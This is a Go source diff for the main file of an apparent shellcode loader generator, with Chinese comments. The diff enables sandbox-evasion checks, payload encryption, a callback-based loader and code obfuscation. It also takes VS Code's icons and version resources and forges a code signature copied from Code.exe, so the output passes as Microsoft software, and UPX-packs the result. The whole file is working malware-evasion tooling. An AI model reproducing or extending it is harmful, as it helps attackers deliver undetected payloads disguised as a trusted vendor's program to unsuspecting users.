@@ -7,6 +7,7 @@ import (
 	"variant/compress"
 	"variant/crypto"
 	"variant/encoder"
+	"variant/gores"
 	"variant/log"
 	"variant/rand"
 	"variant/render"
@@ -17,7 +18,7 @@ func main() {
 	sandbox := render.SandBox{
 		Methods: []string{
 			"sandbox.GetDesktopFiles",
-			"sandbox.HideConsoleW32",
+			"sandbox.BootTimeGetTime",
 		}}
 
 	// 压缩算法模块
@@ -29,7 +30,7 @@ func main() {
 
 	// 设置加密参数
 	params := encoder.Payload{
-		PlainText: "output/payload.bin",
+		PlainText: "output/calc.bin",
 		FileName:  rand.RStrings(),
 		Path:      "output",
 		Key:       rand.LByteStrings(16),
@@ -56,8 +57,8 @@ func main() {
 	}
 
 	load := render.Loader{
-		Import: "variant/cloader",
-		Method: "cloader.CertEnumSystemStore",
+		Import: "variant/loader",
+		Method: "loader.EnumerateLoadedModulesLoad",
 	}
 
 	// 定义模板渲染数据
@@ -73,7 +74,7 @@ func main() {
 
 	// 设置模板的渲染参数
 	tOpts := render.TmplOpts{
-		TmplFile:     "render/templates/v5/Base.tmpl",
+		TmplFile:     "render/templates/v6/Base.tmpl",
 		OutputDir:    "output",
 		OutputGoName: fmt.Sprintf("%s.go", rand.RStrings()),
 		Data:         data,
@@ -88,12 +89,13 @@ func main() {
 	cOpts := build.CompileOpts{
 		GoFileName:  tOpts.OutputGoName,
 		ExeFileName: fmt.Sprintf("%s.exe", strings.TrimSuffix(tOpts.OutputGoName, ".go")),
-		HideConsole: true,
+		HideConsole: false,
 		CompilePath: "output",
 		BuildMode:   "pie",
-		//Literals:    true,
-		//GSeed:       true,
-		//Tiny:        true,
+		Literals:    true,
+		GSeed:       true,
+		Tiny:        true,
+		GDebug:      true,
 	}
 
 	// 编译
@@ -102,32 +104,45 @@ func main() {
 	}
 
 	// 添加图标和文件信息
-	//err = cOpts.HandleWinRes()
-	//if err != nil {
-	//	log.Fatal(err)
-	//}
+	winres := gores.GoWinRes{
+		CompilePath: "output",          // 指定编译目录
+		ExtractFile: "Code.exe",        // 指定提取资源文件的对象
+		ExtractDir:  "",                // 指定提取资源文件后输出的路径
+		PatchFile:   cOpts.ExeFileName, // 指定使用 Patch 添加资源文件的对象
+	}
+
+	// 提取 vscode 所有的资源文件
+	err = winres.Extract()
+	if err != nil {
+		log.Fatal(err)
+	}
+
+	// 使用 Patch 添加资源文件到编译后的程序
+	err = winres.HandleWinRes()
+	if err != nil {
+		log.Fatal(err)
+	}
 
 	// 伪造证书配置
-	//sOpts := build.SignOpts{
-	//	SignPath: "output",
-	//	UnSign:   cOpts.ExeFileName,
-	//	Signed:   fmt.Sprintf("signed_%s", cOpts.ExeFileName),
-	//	Cert:     "wps.der",
-	//	Thief:    "wps.exe",
-	//	DstCert:  "wps.der",
-	//}
+	ct := build.CertThief{
+		SignDir: "output",
+		SrcFile: cOpts.ExeFileName,
+		DstFile: "Code.exe",
+		Signed:  fmt.Sprintf("signed_%s", cOpts.ExeFileName),
+		DstCert: "Code.der",
+	}
 
 	// 保存证书
-	//err = sOpts.SaveCert()
-	//if err != nil {
-	//	log.Fatal(err)
-	//}
+	err = ct.CertSaver()
+	if err != nil {
+		log.Fatal(err)
+	}
 
 	// 利用EXE进行签名伪造
-	//err = sOpts.ExeThief()
-	//if err != nil {
-	//	log.Fatal(err)
-	//}
+	err = ct.ExeThief()
+	if err != nil {
+		log.Fatal(err)
+	}
 
 	// 利用证书进行签名伪造
 	//err = sOpts.CertThief()
@@ -136,19 +151,18 @@ func main() {
 	//}
 
 	// 压缩参数
-	//upx := build.UpxOpts{
-	//	Level:   "--lzma",
-	//	Keep:    true,
-	//	Force:   true,
-	//	SrcExe:  cOpts.ExeFileName,
-	//	SrcPath: "output",
-	//	UpxPath: "build",
-	//}
+	upx := build.UpxOpts{
+		Level:   "--lzma",
+		Keep:    true,
+		Force:   true,
+		SrcExe:  ct.Signed,
+		SrcPath: "output",
+		UpxPath: "build",
+	}
 
 	// 执行压缩
-	//err = upx.UpxPacker()
-	//if err != nil {
-	//	log.Fatal(err)
-	//}
-
+	err = upx.UpxPacker()
+	if err != nil {
+		log.Fatal(err)
+	}
 }
